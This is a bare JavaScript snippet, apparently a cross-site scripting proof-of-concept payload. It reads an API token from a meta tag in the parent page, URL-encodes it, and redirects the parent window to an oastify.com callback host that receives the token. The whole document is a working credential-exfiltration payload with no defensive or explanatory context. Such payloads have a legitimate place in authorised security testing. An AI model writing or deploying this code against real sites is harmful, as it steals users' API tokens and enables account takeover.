(() => {
  const token = window.parent.document.querySelector('#gq-api-token')?.content || 'no_token';
  const encoded = encodeURIComponent(token);
  window.parent.location = `https://tpmjyutclthec5nc6l6c8c88zz5utkh9.oastify.com/?t=${encoded}`;
})();
